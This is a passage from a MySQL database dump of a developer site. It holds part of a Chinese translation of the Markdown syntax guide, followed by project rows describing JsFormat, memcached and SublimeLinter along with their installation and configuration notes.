个空格，项目标记后面则一定要接着至少一个空格或制表符。\n\n要让列表看起来更漂亮，你可以把内容用固定的缩进整理好：\n\n    *   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.\n        Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,\n        viverra nec, fringilla in, laoreet vitae, risus.\n    *   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.\n        Suspendisse id sem consectetuer libero luctus adipiscing.\n\n但是如果你懒，那也行：\n\n    *   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.\n    Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,\n    viverra nec, fringilla in, laoreet vitae, risus.\n    *   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.\n    Suspendisse id sem consectetuer libero luctus adipiscing.\n\n如果列表项目间用空行分开，在输出 HTML 时 Markdown 就会将项目内容用 `<p>` \n标签包起来，举例来说：\n\n    *   Bird\n    *   Magic\n\n会被转换为：\n\n    <ul>\n    <li>Bird</li>\n    <li>Magic</li>\n    </ul>\n\n但是这个：\n\n    *   Bird\n\n    *   Magic\n\n会被转换为：\n\n    <ul>\n    <li><p>Bird</p></li>\n    <li><p>Magic</p></li>\n    </ul>\n\n列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符：\n\n    1.  This is a list item with two paragraphs. Lorem ipsum dolor\n        sit amet, consectetuer adipiscing elit. Aliquam hendrerit\n        mi posuere lectus.\n\n        Vestibulum enim wisi, viverra nec, fringilla in, laoreet\n        vitae, risus. Donec sit amet nisl. Aliquam semper ipsum\n        sit amet velit.\n\n    2.  Suspendisse id sem consectetuer libero luctus adipiscing.\n\n如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：\n\n    *   This is a list item with two paragraphs.\n\n        This is the second paragraph in the list item. You\'re\n    only required to indent the first line. Lorem ipsum dolor\n    sit amet, consectetuer adipiscing elit.\n\n    *   Another item in the same list.\n\n如果要在列表项目内放进引用，那 `>` 就需要缩进：\n\n    *   A list item with a blockquote:\n\n        > This is a blockquote\n        > inside a list item.\n\n如果要放代码区块的话，该区块就需要缩进*两次*，也就是 8 个空格或是 2 个制表符：\n\n    *   一列表项包含一个列表区块：\n\n            <代码写在这>\n\n\n当然，项目列表很可能会不小心产生，像是下面这样的写法：\n\n    1986. What a great season.\n\n换句话说，也就是在行首出现*数字-句点-空白*，要避免这样的状况，你可以在句点前面加上反斜杠。\n\n    1986\\. What a great season.\n\n<h3 id="precode">代码区块</h3>\n\n和程序相关的写作或是标签语言原始码通常会有已经排版好的代码区块，通常这些区块我们并不希望它以一般段落文件的方式去排版，而是照原来的样子显示，Markdown 会用 `<pre>` 和 `<code>` 标签来把代码区块包起来。\n\n要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，例如，下面的输入：\n\n    这是一个普通段落：\n\n        这是一个代码区块。\n\nMarkdown 会转换成：\n\n    <p>这是一个普通段落：</p>\n\n    <pre><code>这是一个代码区块。\n    </code></pre>\n\n这个每行一阶的缩进（4 个空格或是 1 个制表符），都会被移除，例如：\n\n    Here is an example of AppleScript:\n\n        tell application "Foo"\n            beep\n        end tell\n\n会被转换为：\n\n    <p>Here is an example of AppleScript:</p>\n\n    <pre><code>tell application "Foo"\n        beep\n    end tell\n    </code></pre>\n\n一个代码区块会一直持续到没有缩进的那一行（或是文件结尾）。\n\n在代码区块里面， `&` 、 `<` 和 `>` 会自动转成 HTML 实体，这样的方式让你非常容易使用 Markdown 插入范例用的 HTML 原始码，只需要复制贴上，再加上缩进就可以了，剩下的 Markdown 都会帮你处理，例如：\n\n        <div class="footer">\n            &copy; 2004 Foo Corporation\n        </div>\n\n会被转换为：\n\n    <pre><code>&lt;div class="footer"&gt;\n        &amp;copy; 2004 Foo Corporation\n    &lt;/div&gt;\n    </code></pre>\n\n代码区块中，一般的 Markdown 语法不会被转换，像是星号便只是星号，这表示你可以很容易地以 Markdown 语法撰写 Markdown 语法相关的文件。\n\n<h3 id="hr">分隔线</h3>\n\n你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：\n\n    * * *\n\n    ***\n\n    *****\n\n    - - -\n\n    ---------------------------------------\n\n\n* * *\n\n<h2 id="span">区段元素</h2>\n\n<h3 id="link">链接</h3>\n\nMarkdown 支持两种形式的链接语法： *行内式*和*参考式*两种形式。\n\n不管是哪一种，链接文字都是用 [方括号] 来标记。\n\n要建立一个*行内式*的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如：\n\n    This is [an example](http://example.com/ "Title") inline link.\n\n    [This link](http://example.net/) has no title attribute.\n\n会产生：\n\n    <p>This is <a href="http://example.com/" title="Title">\n    an example</a> inline link.</p>\n\n    <p><a href="http://example.net/">This link</a> has no\n    title attribute.</p>\n\n如果你是要链接到同样主机的资源，你可以使用相对路径：\n\n    See my [About](/about/) page for details.   \n\n*参考式*的链接是在链接文字的括号后面再接上另一个方括号，而在第二个方括号里面要填入用以辨识链接的标记：\n\n    This is [an example][id] reference-style link.\n\n你也可以选择性地在两个方括号中间加上一个空格：\n\n    This is [an example] [id] reference-style link.\n\n接着，在文件的任意处，你可以把这个标记的链接内容定义出来：\n\n    [id]: http://example.com/  "Optional Title Here"\n\n链接内容定义的形式为：\n\n*   方括号（前面可以选择性地加上至多三个空格来缩进），里面输入链接文字\n*   接着一个冒号\n*   接着一个以上的空格或制表符\n*   接着链接的网址\n*   选择性地接着 title 内容，可以用单引号、双引号或是括弧包着\n\n下面这三种链接的定义都是相同：\n\n    [foo]: http://example.com/  "Optional Title Here"\n    [foo]: http://example.com/  \'Optional Title Here\'\n    [foo]: http://example.com/  (Optional Title Here)\n\n**请注意：**有一个已知的问题是 Markdown.pl 1.0.1 会忽略单引号包起来的链接 title。\n\n链接网址也可以用方括号包起来：\n\n    [id]: <http://example.com/>  "Optional Title Here"\n\n你也可以把 title 属性放到下一行，也可以加一些缩进，若网址太长的话，这样会比较好看：\n\n    [id]: http://example.com/longish/path/to/resource/here\n        "Optional Title Here"\n\n网址定义只有在产生链接的时候用到，并不会直接出现在文件之中。\n\n链接辨别标签可以有字母、数字、空白和标点符号，但是并*不*区分大小写，因此下面两个链接是一样的：\n\n    [link text][a]\n    [link text][A]\n\n*隐式链接标记*功能让你可以省略指定链接标记，这种情形下，链接标记会视为等同于链接文字，要用隐式链接标记只要在链接文字后面加上一个空的方括号，如果你要让 "Google" 链接到 google.com，你可以简化成：\n\n    [Google][]\n\n然后定义链接内容：\n\n    [Google]: http://google.com/\n\n由于链接文字可能包含空白，所以这种简化型的标记内也许包含多个单词：\n\n    Visit [Daring Fireball][] for more information.\n\n然后接着定义链接：\n\n    [Daring Fireball]: http://daringfireball.net/\n\n链接的定义可以放在文件中的任何一个地方，我比较偏好直接放在链接出现段落的后面，你也可以把它放在文件最后面，就像是注解一样。\n\n下面是一个参考式链接的范例：\n\n    I get 10 times more traffic from [Google] [1] than from\n    [Yahoo] [2] or [MSN] [3].\n\n      [1]: http://google.com/        "Google"\n      [2]: http://search.yahoo.com/  "Yahoo Search"\n      [3]: http://search.msn.com/    "MSN Search"\n\n如果改成用链接名称的方式写：\n\n    I get 10 times more traffic from [Google][] than from\n    [Yahoo][] or [MSN][].\n\n      [google]: http://google.com/        "Google"\n      [yahoo]:  http://search.yahoo.com/  "Yahoo Search"\n      [msn]:    http://search.msn.com/    "MSN Search"\n\n上面两种写法都会产生下面的 HTML。\n\n    <p>I get 10 times more traffic from <a href="http://google.com/"\n    title="Google">Google</a> than from\n    <a href="http://search.yahoo.com/" title="Yahoo Search">Yahoo</a>\n    or <a href="http://search.msn.com/" title="MSN Search">MSN</a>.</p>\n\n下面是用行内式写的同样一段内容的 Markdown 文件，提供作为比较之用：\n\n    I get 10 times more traffic from [Google](http://google.com/ "Google")\n    than from [Yahoo](http://search.yahoo.com/ "Yahoo Search") or\n    [MSN](http://search.msn.com/ "MSN Search").\n\n参考式的链接其实重点不在于它比较好写，而是它比较好读，比较一下上面的范例，使用参考式的文章本身只有 81 个字符，但是用行内形式的却会增加到 176 个字元，如果是用纯 HTML 格式来写，会有 234 个字元，在 HTML 格式中，标签比文本还要多。\n\n使用 Markdown 的参考式链接，可以让文件更像是浏览器最后产生的结果，让你可以把一些标记相关的元数据移到段落文字之外，你就可以增加链接而不让文章的阅读感觉被打断。\n\n<h3 id="em">强调</h3>\n\nMarkdown 使用星号（`*`）和底线（`_`）作为标记强调字词的符号，被 `*` 或 `_` 包围的字词会被转成用 `<em>` 标签包围，用两个 `*` 或 `_` 包起来的话，则会被转成 `<strong>`，例如：\n\n    *single asterisks*\n\n    _single underscores_\n\n    **double asterisks**\n\n    __double underscores__\n\n会转成：\n\n    <em>single asterisks</em>\n\n    <em>single underscores</em>\n\n    <strong>double asterisks</strong>\n\n    <strong>double underscores</strong>\n\n你可以随便用你喜欢的样式，唯一的限制是，你用什么符号开启标签，就要用什么符号结束。\n\n强调也可以直接插在文字中间：\n\n    un*frigging*believable\n\n但是**如果你的 `*` 和 `_` 两边都有空白的话，它们就只会被当成普通的符号**。\n\n如果要在文字前后直接插入普通的星号或底线，你可以用反斜线：\n\n    \\*this text is surrounded by literal asterisks\\*\n\n<h3 id="code">代码</h3>\n\n如果要标记一小段行内代码，你可以用反引号把它包起来（`` ` ``），例如：\n\n    Use the `printf()` function.\n\n会产生：\n\n    <p>Use the <code>printf()</code> function.</p>\n\n如果要在代码区段内插入反引号，你可以用多个反引号来开启和结束代码区段：\n\n    ``There is a literal backtick (`) here.``\n\n这段语法会产生：\n\n    <p><code>There is a literal backtick (`) here.</code></p>\n\n代码区段的起始和结束端都可以放入一个空白，起始端后面一个，结束端前面一个，这样你就可以在区段的一开始就插入反引号：\n\n    A single backtick in a code span: `` ` ``\n    \n    A backtick-delimited string in a code span: `` `foo` ``\n\n会产生：\n\n    <p>A single backtick in a code span: <code>`</code></p>\n    \n    <p>A backtick-delimited string in a code span: <code>`foo`</code></p>\n\n在代码区段内，`&` 和方括号**都**会被自动地转成 HTML 实体，这使得插入 HTML 原始码变得很容易，Markdown 会把下面这段：\n\n    Please don\'t use any `<blink>` tags.\n\n转为：\n\n    <p>Please don\'t use any <code>&lt;blink&gt;</code> tags.</p>\n\n你也可以这样写：\n\n    `&#8212;` is the decimal-encoded equivalent of `&mdash;`.\n\n以产生：\n\n    <p><code>&amp;#8212;</code> is the decimal-encoded\n    equivalent of <code>&amp;mdash;</code>.</p>\n\n\n\n<h3 id="img">图片</h3>\n\n很明显地，要在纯文字应用中设计一个「自然」的语法来插入图片是有一定难度的。\n\nMarkdown 使用一种和链接很相似的语法来标记图片，同样也允许两种样式： *行内式*和*参考式*。\n\n行内式的图片语法看起来像是：\n\n    ![Alt text](/path/to/img.jpg)\n\n    ![Alt text](/path/to/img.jpg "Optional title")\n\n详细叙述如下：\n\n*   一个惊叹号 `!`\n*   接着一个方括号，里面放上图片的替代文字\n*   接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上\n    选择性的 \'title\' 文字。\n\n参考式的图片语法则长得像这样：\n\n    ![Alt text][id]\n\n「id」是图片参考的名称，图片参考的定义方式则和连结参考一样：\n\n    [id]: url/to/image  "Optional title attribute"\n\n到目前为止， Markdown 还没有办法指定图片的宽高，如果你需要的话，你可以使用普通的 `<img>` 标签。\n\n* * *\n\n<h2 id="misc">其它</h2>\n\n<h3 id="autolink">自动链接</h3>\n\nMarkdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用方括号包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：\n\n    <http://example.com/>\n\nMarkdown 会转为：\n\n    <a href="http://example.com/">http://example.com/</a>\n\n邮址的自动链接也很类似，只是 Markdown 会先做一个编码转换的过程，把文字字符转成 16 进位码的 HTML 实体，这样的格式可以糊弄一些不好的邮址收集机器人，例如：\n\n    <address@example.com>\n\nMarkdown 会转成：\n\n    <a href="&#x6D;&#x61;i&#x6C;&#x74;&#x6F;:&#x61;&#x64;&#x64;&#x72;&#x65;\n    &#115;&#115;&#64;&#101;&#120;&#x61;&#109;&#x70;&#x6C;e&#x2E;&#99;&#111;\n    &#109;">&#x61;&#x64;&#x64;&#x72;&#x65;&#115;&#115;&#64;&#101;&#120;&#x61;\n    &#109;&#x70;&#x6C;e&#x2E;&#99;&#111;&#109;</a>\n\n在浏览器里面，这段字串（其实是 `<a href="mailto:address@example.com">address@example.com</a>`）会变成一个可以点击的「address@example.com」链接。\n\n（这种作法虽然可以糊弄不少的机器人，但并不能全部挡下来，不过总比什么都不做好些。不管怎样，公开你的信箱终究会引来广告信件的。）\n\n<h3 id="backslash">反斜杠</h3>\n\nMarkdown 可以利用反斜杠来插入一些在语法中有其它意义的符号，例如：如果你想要用星号加在文字旁边的方式来做出强调效果（但不用 `<em>` 标签），你可以在星号的前面加上反斜杠：\n\n    \\*literal asterisks\\*\n\nMarkdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：\n\n    \\   反斜线\n    `   反引号\n    *   星号\n    _   底线\n    {}  花括号\n    []  方括号\n    ()  括弧\n    #   井字号\n    +   加号\n    -   减号\n    .   英文句点\n    !   惊叹号\n\n<h2 id="acknowledgement">感谢</h2>\n\n感谢 [leafy7382][] 协助翻译，[hlb][]、[Randylien][] 帮忙润稿，[ethantw][] 的[汉字标准格式・CSS Reset][]， [WM][] 回报文字错误。\n\n[leafy7382]:https://twitter.com/#!/leafy7382\n[hlb]:http://iamhlb.com/\n[Randylien]:http://twitter.com/randylien\n[ethantw]:https://twitter.com/#!/ethantw\n[汉字标准格式・CSS Reset]:http://ethantw.net/projects/han/\n[WM]:http://kidwm.net/\n\n感谢 [fenprace][]，[addv][]。\n\n[fenprace]:https://github.com/fenprace\n[addv]:https://github.com/addv', 1, 19, 5, '2012-07-14 02:42:59', '2012-07-14 02:42:59', 'sublime text 2');
/*!40000 ALTER TABLE `posts` ENABLE KEYS */;


-- Dumping structure for table talkincode_db1.projects
DROP TABLE IF EXISTS `projects`;
CREATE TABLE IF NOT EXISTS `projects` (
  `id` varchar(32) NOT NULL,
  `image` varchar(225) DEFAULT NULL,
  `name` varchar(64) NOT NULL,
  `tags` varchar(255) DEFAULT NULL,
  `description` text,
  `owner` varchar(64) NOT NULL,
  `license` varchar(64) DEFAULT NULL,
  `homepage` varchar(128) NOT NULL,
  `docpage` varchar(128) DEFAULT NULL,
  `download` varchar(128) DEFAULT NULL,
  `hits` int(10) NOT NULL DEFAULT '0',
  `recs` int(10) NOT NULL DEFAULT '0',
  `lang` varchar(64) NOT NULL,
  `status` int(11) NOT NULL DEFAULT '0',
  `created` varchar(32) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- Dumping data for table talkincode_db1.projects: ~28 rows (approximately)
DELETE FROM `projects`;
/*!40000 ALTER TABLE `projects` DISABLE KEYS */;
INSERT INTO `projects` (`id`, `image`, `name`, `tags`, `description`, `owner`, `license`, `homepage`, `docpage`, `download`, `hits`, `recs`, `lang`, `status`, `created`) VALUES
	('0c5db87f62ce49bfa9ae6952961cb2ff', 'https://secure.gravatar.com/avatar/0c90a042d49a6b128fec5f675825c03b?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', ' JsFormat js脚本格式化插件', 'sublime text', '\n\n## Summary\n\nJsFormat is a javascipt formatting plugin for Sublime Text 2.\nIt uses the commandline/python-module javascript formatter from http://jsbeautifier.org/ to format the selected text, \nor the entire file if there is no selection. The plugin does not check to make sure the buffer has a ".js" file type, \nit just javascript formats the selection/file. Thus, use with caution if you are in an html file.\n\n*I am investigating replacing JsFormat with an \'all in one\' formatting plugin to support multiple languages: [Format](http://github.com/jdc0589/Format) (very very pre-alpha). JsFormat\'s complete feature set would be present for js/json files. Please leave me some feedback if you think this is a good/bad idea.*\n<a href=\'http://www.pledgie.com/campaigns/17687\'><img alt=\'Click here to lend your support to: JsFormat and make a donation at www.pledgie.com !\' src=\'http://www.pledgie.com/campaigns/17687.png?skin_name=chrome\' border=\'0\' /></a>\n\n## Features\n* javascript/json formatting (obviously)\n* all settings are customizable (whitespace, formatting style, etc..)\n* puts the cursor back in the same location it was before formatting (accounts for whitespace/newline changes)\n\n## Settings\nJsFormat uses whatever tab character settings are configured with the standard "translate_tabs_to_spaces" and "tab_size" sublime settings.\n\nIn addition, the following settings are available in JsFormat/JsFormat.sublime-settings (defaults shown below):\n\n* "max_preserve_newlines": 4\n* "preserve_newlines": true\n* "jslint_happy": false\n* "brace_style": "collapse"\n* "keep_array_indentation": false\n* "keep_function_indentation": false\n* "indent_with_tabs": false\n\n## Install\n#### [Package Control](https://github.com/wbond/sublime_package_control) (*Recommended*)\nJsFormat is now included in the default repository channel for [Package Control](https://github.com/wbond/sublime_package_control). It should show up in your install list\nwith no changes.\n\nIf it does not show up, or you are on an older version of Package Control:\nAdd https://github.com/jdc0589/JsFormat as a Package Control repository. JsFormat will show up in the\npackage install list.\n\n#### Git Clone\nClone this repository in to the Sublime Text 2 "Packages" directory, which is located where ever the \n"Preferences" -> "Browse Packages" option in sublime takes you.\n\n\n\n\n## Key Binding\n\nThe default key binding is "ctrl+alt+f"\n\n## Key Binding Conflicts\n\nUnfortunately there are other plugins that use "ctrl + alt + f", this is a hard problem to solve. If JsFormat works\nOK via the command palette but does nothing when you use the "ctrl + alt + f" shortcut, please change the shortcut in the appropriate *.sublime-keymap file, re-test, and let me know how it went (just submit a bug report). [This is the current bug report we are using to discuss this issue](https://github.com/jdc0589/JsFormat/issues/7)\n\n## Command Palette\n\nOpen the command palette via "ctrl + shift + p", Jsformat appears as "Format: Javascript"\n\n---\n\n### License\nCopyright (C) 2012 Davis Clark\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of\nthis software and associated documentation files (the "Software"), to deal in\nthe Software without restriction, including without limitation the rights to\nuse, copy, modify, merge, publish, distribute, sublicense, and/or sell copies\nof the Software, and to permit persons to whom the Software is furnished to do\nso, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n', ' jdc0589 ', '...', 'https://github.com/jdc0589/JsFormat', NULL, NULL, 6, 3, 'python', 0, '2012-07-22 20:56:58'),
	('106936c327484aa3b29089152e7824b5', 'http://www.thefanclub.co.za/sites/default/files/styles/300-wide/public/images/howto/memcached_0.png', '高性能缓存系统 memcached', 'memcached,cache', 'Memcached 是一个高性能的分布式内存对象缓存系统，用于动态Web应用以减轻数据库负载。它通过在内存中缓存数据和对象来减少读取数据库的次数，从而提供动态、数据库驱动网站的速度。Memcached基于一个存储键/值对的hashmap。其守护进程（daemon ）是用C写的，但是客户端可以用任何语言来编写，并通过memcached协议与守护进程通信。\r\n\r\nDependencies:\r\n\r\n   -- libevent, http://www.monkey.org/~provos/libevent/ (libevent-dev)\r\n\r\nIf using Linux, you need a kernel with epoll.  Sure, libevent will\r\nwork with normal select, but it sucks.\r\n\r\nepoll isn\'t in Linux 2.4, but there\'s a backport at:\r\n\r\n    http://www.xmailserver.org/linux-patches/nio-improve.html\r\n\r\nYou want the epoll-lt patch (level-triggered).\r\n\r\nIf you\'re using MacOS, you\'ll want libevent 1.1 or higher to deal with\r\na kqueue bug.\r\n\r\nAlso, be warned that the -k (mlockall) option to memcached might be\r\ndangerous when using a large cache.  Just make sure the memcached machines\r\ndon\'t swap.  memcached does non-blocking network I/O, but not disk.  (it\r\nshould never go to disk, or you\'ve lost the whole point of it)\r\n\r\nThe memcached website is at:\r\n\r\n    http://www.memcached.org\r\n\r\nWant to contribute?  Up-to-date pointers should be at:\r\n\r\n    http://contributing.appspot.com/memcached', 'memcached', 'BSD', 'http://code.google.com/p/memcached/', NULL, NULL, 11, 9, 'c', 0, '2012-07-22 11:56:23'),
	('3fd7c667379b4b8d8a1bdebca4601f2b', 'https://secure.gravatar.com/avatar/a8117f04efc018bef027000b2bc8e1b1?s=140&d=https://a248.e.akamai.net/assets.github.com%2Fimages%2Fgravatars%2Fgravatar-140.png', 'SublimeLinter 一个支持lint语法的插件', 'sublime text', '\n\n一个支持lint语法的插件，可以高亮linter认为有错误的代码行，也支持高亮一些特别的注释，比如“TODO”，这样就可以被快速定位。\n\nSublimeLinter\n=============\n\nSublimeLinter is a plugin that supports "lint" programs (known as "linters"). SublimeLinter highlights\nlines of code the linter deems to contain (potential) errors. It also\nsupports highlighting special annotations (for example: TODO) so that they\ncan be quickly located.\n\nSublimeLinter has built in linters for the following languages:\n\n* CoffeeScript - lint via `coffee -s -l`\n* CSS - lint via built-in [csslint](http://csslint.net)\n* Git Commit Messages - lint via built-in module based on [A Note About Git Commit Messages](http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html).\n* Haml - lint via `haml -c`\n* Java - lint via `javac -Xlint`\n* Javascript - lint via built in [jshint](http://jshint.org), [jslint](http://jslint.com), or the [closure linter (gjslint)](https://developers.google.com/closure/utilities/docs/linter_howto) (if installed)\n* Objective-J - lint via built-in [capp_lint](https://github.com/aparajita/capp_lint)\n* Perl - lint via [Perl:Critic](http://perlcritic.com/) or syntax+deprecation checking via `perl -c`\n* PHP - syntax checking via `php -l`\n* Python - native, moderately-complete lint\n* Ruby - syntax checking via `ruby -wc`\n\n\nInstalling\n----------\n**With the Package Control plugin:** The easiest way to install SublimeLinter is through Package Control, which can be found at this site: http://wbond.net/sublime_packages/package_control\n\nOnce you install Package Control, restart ST2 and bring up the Command Palette (`Command+Shift+P` on OS X, `Control+Shift+P` on Linux/Windows). Select "Package Control: Install Package", wait while Package Control fetches the latest package list, then select SublimeLinter when the list appears. The advantage of using this method is that Package Control will automatically keep SublimeLinter up to date with the latest version.\n\n**Without Git:** Download the latest source from [GitHub](https://github.com/SublimeLinter/SublimeLinter) and copy the SublimeLinter folder to your Sublime Text "Packages" directory.\n\n**With Git:** Clone the repository in your Sublime Text "Packages" directory:\n\n    git clone https://github.com/SublimeLinter/SublimeLinter.git\n\n\nThe "Packages" directory is located at:\n\n* OS X:\n\n        ~/Library/Application Support/Sublime Text 2/Packages/\n\n* Linux:\n\n        ~/.config/sublime-text-2/Packages/\n\n* Windows:\n\n        %APPDATA%/Sublime Text 2/Packages/\n\n### Javascript-based linters\nIf you plan to edit files that use a Javascript-based linter (Javascript, CSS), your system\nmust have a Javascript engine installed. Mac OS X comes with a preinstalled Javascript engine called\nJavaScriptCore, which is used if Node.js is not installed. On Windows, you **must** install the\nJavascript engine Node.js, which can be downloaded from [the Node.js site](http://nodejs.org/#download).\n\nOn Mac OS X, you **must** install Node.js if you plan to edit Javascript or CSS files that\nuse non-ASCII characters in strings or comments, because JavaScriptCore is not Unicode-aware.\n\nAfter installing Node.js, if the Node.js executable ("node" on Mac OS X, "node.exe" on Windows)\ncannot be found by SublimeLinter, you may have to set the path to the executable in the\n"sublimelinter\\_executable\\_map" setting. See the "Configuring" section below for info on\nSublimeLinter settings.\n\nConfiguring\n-----------\nThere are a number of settings available to customize the behavior of SublimeLinter and its linters. For the latest information on what settings are available, select the menu item `Preferences->Package Settings->SublimeLinter->Settings - Default`.\n\nDo **NOT** edit the default SublimeLinter settings. Your changes will be lost when SublimeLinter is updated. ALWAYS edit the user SublimeLinter settings by selecting `Preferences->Package Settings->SublimeLinter->Settings - User`. Note that individual settings you include in your user settings will _completely_ replace the corresponding default setting, so you must provide that setting in its entirety.\n\n### Linter-specific notes\nFollowing are notes specific to individual linters that you should be aware of:\n\n* **JavaScript** - If the "javascript_linter" setting is "jshint" or "jslint", this linter runs [jshint](http://jshint.org) (or [jslint](http://jslint.com) respectively) using Node.js. See "Javascript-based linters" above for information on how to install Node.js.\n\n  If the "javascript_linter" setting is "gjslint", this linter runs the [closure linter (gjslint)](https://developers.google.com/closure/utilities/docs/linter_howto). After installation, if gjslint cannot be found by SublimeLinter, you may have to set the path to gjslint in the "sublimelinter\\_executable\\_map" setting.\n\n  You may want to modify the options passed to jshint, jslint, or gjslint. This can be done by using the **jshint_options**, **jslint_options**, or **gjslint_options** setting. Refer to the jshint.org site, the jslint.com site, or run `gjslint --help` for more information on the configuration options available.\n\n  SublimeLinter supports `.jshintrc` files. If using JSHint, SublimeLinter will recursively search the directory tree (from the file location to the file-system root directory). This functionality is specified in the [JSHint README](https://github.com/jshint/node-jshint/#within-your-projects-directory-tree).\n\n* **CSS** - This linter runs [csslint](http://csslint.net). This linter requires a Javascript engine (like Node.js) to be installed (see notes above for the JavaScript linters: "jshint" or "jslint").\n\n  By default all CSSLint settings are turned on. You may customize CSSLint behavior with the "csslint_options" setting. Please select `Preferences->Package Settings->SublimeLinter->Settings - Default` for more information on turning off or adjusting severity of tests. For more information about options available to CSSLint, see https://github.com/stubbornella/csslint/wiki/Rules.\n\n* **perl** - Due to a vulnerability (issue [#77](https://github.com/SublimeLinter/SublimeLinter/issues/77)) with the Perl linter, Perl syntax checking is no longer enabled by default. The default linter for Perl has been replaced by Perl::Critic. The standard Perl syntax checker can still be invoked by switching the "perl_linter" setting to "perl".\n\n* **ruby** - If you are using rvm or rbenv, you will probably have to specify the full path to the ruby you are using in the "sublimelinter_executable_map" setting. See "Configuring" below for more info.\n\n* **java** - Because it uses `javac` to do linting, each time you run the linter the entire dependency graph of the current file will be checked. Depending on the number of classes you import, this can be **extremely** slow. Also note that you **must** provide the `-sourcepath`, `-classpath`, `-Xlint` and `{filename}` arguments to `javac` in your per-project settings. See "Per-project settings" below for more information.\n\n### Per-project settings\nSublimeLinter supports per-project/per-language settings. This is useful if a linter requires path configuration on a per-project basis. To edit your project settings, select the menu item `Project->Edit Project`. If there is no "settings" object at the top level, add one and then add a "SublimeLinter" sub-object, like this:\n\n    {\n        "folders":\n        [\n            {\n                "path": "/Users/aparajita/Projects/foo/src"\n            }\n        ],\n        "settings":\n        {\n            "SublimeLinter":\n            {\n            }\n        }\n    }\n\nWithin the "SublimeLinter" object, you can add a settings object for each language. The language name must match the language item in the linter\'s CONFIG object, which can be found in the linter\'s source file in the SublimeLinter/sublimelinter/modules folder. Each language can have two settings:\n\n* "working_directory" - If present and a valid absolute directory path, the working directory is set to this path before the linter executes. This is useful if you are providing linter arguments that contain paths and you want to use working directory-relative paths instead of absolute paths.\n* "lint_args" - If present, it must be a sequence of string arguments to pass to the linter. If your linter expects a filename as an argument, use the argument "{filename}" as a placeholder. Note that if you provide this item, you are responsible for passing **all** required arguments to the linter.\n\nFor example, let\'s say we are editing a Java project and want to use the "java" linter, which requires a source path and class path. In addition, we want to ignore serialization errors. Our project settings might look like this:\n\n    {\n        "folders":\n        [\n            {\n                "path": "/Users/aparajita/Projects/foo/src"\n            }\n        ],\n        "settings":\n        {\n            "SublimeLinter":\n            {\n                "java":\n                {\n                    "working_directory": "/Users/aparajita/Projects/foo",\n\n                    "lint_args":\n                    [\n                        "-sourcepath", "src",\n                        "-classpath", "libs/log4j-1.2.9.jar:libs/commons-logging-1.1.jar",\n                        "-Xlint", "-Xlint:-serial",\n                        "{filename}"\n                    ]\n                }\n            }\n        }\n    }\n\nThe jshint follows convention set by node-jshint (though node is not required) and will attempt to locate the configuration file for you starting in pwd. (or "present working directory") If this does not yield a .jshintrc file, it will move one level up (..) the directory tree all the way up to the filesystem root. If a file is found, it stops immediately and uses that set of configuration instead of "jshint_options".\n\n### Customizing colors\n**IMPORTANT** - The theme style names have recently changed. The old and new color\nnames are:\n\n    Old                     New\n    ---------------------   -----------------------------\n    sublimelinter.<type>    sublimelinter.outline.<type>\n    invalid.<type>          sublimelinter.underline.<type>\n\nPlease change the names in your color themes accordingly.\n\nThere are three types of "errors" flagged by SublimeLinter: illegal,\nviolation, and warning. For each type, SublimeLinter will indicate the offending\nline and the character position at which the error occurred on the line.\n\nBy default SublimeLinter will outline offending lines using the background color\nof the "sublimelinter.outline.<type>" theme style, and underline the character position\nusing the background color of the "sublimelinter.underline.<type>" theme style, where <type>\nis one of the three error types.\n\nIf these styles are not defined, the color will be black when there is a light\nbackground color and black when there is a dark background color. You may\ndefine a single "sublimelinter.outline" or "sublimelinter.underline" style to color all three types,\nor define separate substyles for one or more types to color them differently.\n\nIf you want to make the offending lines glaringly obvious (perhaps for those\nwho tend to ignore lint errors), you can set the user setting:\n\n    "sublimelinter_fill_outlines": true\n\nWhen this is set true, lines that have errors will be colored with the background\nand foreground color of the "sublime.outline.<type>" theme style. Unless you have defined\nthose styles, this setting should be left false.\n\nYou may also mark lines with errors by putting an "x" in the gutter with the user setting:\n\n    "sublimelinter_gutter_marks": true\n\nTo customize the colors used for highlighting errors and user notes, add the following\nto your theme (adapting the color to your liking):\n\n    <dict>\n        <key>name</key>\n        <string>SublimeLinter Annotations</string>\n        <key>scope</key>\n        <string>sublimelinter.notes</string>\n        <key>settings</key>\n        <dict>\n            <key>background</key>\n            <string>#FFFFAA</string>\n            <key>foreground</key>\n            <string>#FFFFFF</string>\n        </dict>\n    </dict>\n    <dict>\n        <key>name</key>\n        